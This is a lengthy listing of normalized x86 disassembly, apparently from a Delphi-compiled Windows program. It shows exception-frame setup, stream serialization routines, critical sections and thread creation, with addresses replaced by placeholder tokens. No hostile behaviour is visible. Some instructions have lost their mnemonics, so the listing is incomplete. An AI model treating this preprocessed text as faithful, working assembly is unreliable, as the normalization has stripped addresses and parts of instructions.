mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_413fac
xor eax eax
push ebp
push sub_419417
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_414164
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41941e
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_403124
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_414108
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_419468
call sub_402774
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_40392c
jmp r-xdata
call sub_4038d8
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_41756c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4194d8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_419497
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_417714
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_4038d8
call sub_40392c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4194d8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_403124
sub_419504
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4195ae
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_419581
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4197c0
cmp al 0xb
je r-xdata
mov eax ebx
call sub_410b84
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_41785c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_417894
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4195b5
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4195e4
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_4195e4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_417d84
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_403fe8
mov eax esi
call j_sub_4043c4
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_417d84
pop edx
pop esi
pop ebx
retn
sub_419620
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4196cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_417d60
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4196dc
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404180
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4196d4
lea eax [ ebp - 0x8 ]
call sub_4045d8
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_4197c0
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_417d84
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404544
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_417d84
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_417d84
jmp r-xdata
jmp r-xdata
call sub_41785c
sub_4196dc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4197b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_417d60
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_419620
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404724
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4197ba
lea eax [ ebp - 0xc ]
call sub_403ef8
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_4197c0
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_417d84
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404820
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_417d84
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_417d84
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404544
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_417d84
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405968
jmp r-xdata
jmp r-xdata
call sub_41785c
sub_4197d4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_419810
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4195e4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419817
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_41981c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_417a1c
test al al
je r-xdata
mov eax [ ebx ]
call sub_4198d0
mov eax [ ebx ]
call sub_418988
pop ebx
pop ebp
retn
sub_419844
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_417d84
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_419cc8
pop ebx
pop ecx
pop ebp
retn
sub_419874
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_417a1c
test al al
je r-xdata
mov eax [ ebx ]
call sub_417d60
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_418988
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_419cc8
jmp r-xdata
mov eax [ ebx ]
call sub_4198d0
mov eax [ ebx ]
call sub_417a1c
test al al
je r-xdata
mov eax [ ebx ]
call sub_419a6c
mov eax [ ebx ]
call sub_418988
sub_4198d0
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419a5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4197c0
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419a66
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
jmp [ eax * 4 + jump_table_419907 ]
push ebp
call sub_41981c
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_419cc8
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_419cc8
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_419cc8
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_419cc8
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4195e4
jmp r-xdata
push ebp
mov eax 0x1
call sub_419844
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4197d4
jmp r-xdata
push ebp
mov eax 0x1
call sub_419844
pop ecx
jmp r-xdata
push ebp
call sub_419874
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_419cc8
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_419cc8
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_419cc8
jmp r-xdata
push ebp
mov eax 0x2
call sub_419844
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_419cc8
jmp r-xdata
push ebp
mov eax 0x1
call sub_419844
pop ecx
sub_419a6c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_419aa9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4195e4
mov eax ebx
call sub_4198d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419ab0
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_419ab4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_419b4c
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_417a1c
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4195e4
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4195e4
jmp r-xdata
mov eax ebx
call sub_419a6c
mov eax ebx
call sub_418988
jmp r-xdata
mov eax ebx
call sub_417a1c
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_419ab4
mov eax ebx
call sub_418988
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419b53
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f1c
retn
sub_419b5c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419c01
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_403f90
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41af84
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419c08
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_4038b0
sub_419c2c
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_419c54
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_417cb4
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_4137a8
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_403350
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_417cb4
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_419cc8
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_417d84
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_417d84
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_419d10
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_419eb9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_4178e8
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419e94
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_417d84
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_4166e4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_417d84
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4171a4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_419e6f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_419620
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_417d84
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_4166e4
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_417d84
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_41080c
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
lea eax [ ebp - 0x1c ]
call sub_405598
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40d1f4
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419e76
mov eax [ ebp - 0xc ]
call sub_403124
retn
sub_419ed8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a0d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40ed68
mov eax [ ebp - 0x4 ]
call sub_417d60
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
jmp [ eax * 4 + jump_table_419f1a ]
mov eax [ ebp - 0x4 ]
call sub_4197c0
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4188d0
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_410044
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4188d0
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_410044
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4188d0
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_410044
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4186b4
mov eax ebx
call sub_4100d4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4186f8
mov eax ebx
call sub_4100d4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41873c
mov eax ebx
call sub_4100fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41878c
mov eax ebx
call sub_4100e8
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_419620
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_410110
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4196dc
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_41013c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4197c0
cmp al 0x9
sete dl
mov eax ebx
call sub_4100ac
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_419d10
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40f090
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41893c
push edx
push eax
mov eax ebx
call sub_410080
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a0d9
lea eax [ ebp - 0x1c ]
call sub_40ed7c
lea eax [ ebp - 0xc ]
call sub_4045d8
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
mov eax ebx
call sub_4108f4
jmp r-xdata
sub_41a0e0
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_41a12c
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_41a158
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_41a2c8
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41a0e0
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_41a2c8
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41a0e0
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_41a2c8
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_41a0e0
jmp r-xdata
pop edx
pop ebx
retn
sub_41a1dc
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_404304
je r-xdata
mov eax esi
call sub_4041b8
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_4041b8
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_41a2c8
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41a0e0
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_41a0e0
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_41a2c8
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41a0e0
mov dl 0x6
mov eax ebx
call sub_41a2c8
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41a0e0
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_41a0e0
sub_41a274
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a2b9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405a0c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_41a1dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a2c0
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_41a374
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_4038b0
call sub_41a328
mov eax ebx
call sub_41a334
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41a502
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41a4e3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a4ea
mov eax [ ebp - 0xc ]
call sub_403124
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_414108
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_413ff8
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_41a4ad
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41a47e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_41a514
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_41a350
test bl bl
je r-xdata
xor eax eax
push ebp
push sub_41a555
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_403ef0
mov eax [ ebp - 0x4 ]
call sub_403124
sub_41a55a
call sub_4027b4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
call sub_40392c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_41a350
test bl bl
je r-xdata
mov eax esi
call sub_403ef0
mov eax [ ebp - 0x4 ]
call sub_403124
sub_41a5bc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_41a666
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_4030f4
call sub_41a35c
mov [ esi + 0xe ] bl
mov [ esi + 0xc ] bl
push esi
push 0x4
lea eax [ esi + 0x8 ]
push eax
mov ecx sub_41a514
xor edx edx
xor eax eax
call sub_403eac
mov ebx eax
mov [ esi + 0x4 ] ebx
test ebx ebx
jne r-xdata
add esp 0xfffffff0
call sub_403448
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a66d
lea eax [ ebp - 0x10 ]
call sub_403ef8
retn
call GetLastError
lea edx [ ebp - 0x10 ]
call sub_40ae60
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_4038b0
sub_41a68c
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
mov eax [ esi + 0x38 ]
call sub_403124
call sub_41a368
test bl bl
jle r-xdata
push eax
call CloseHandle
mov eax esi
call sub_41a9d0
cmp [ esi + 0xc ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
mov eax esi
call sub_41a9d8
mov eax esi
call sub_41a9a8
sub_41a700
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov ebx edx
xor eax eax
push ebp
push sub_41a76e
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a775
lea eax [ ebp - 0x14 ]
call sub_403ef8
retn
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40ae60
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_4038b0
sub_41a7bc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0x0
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
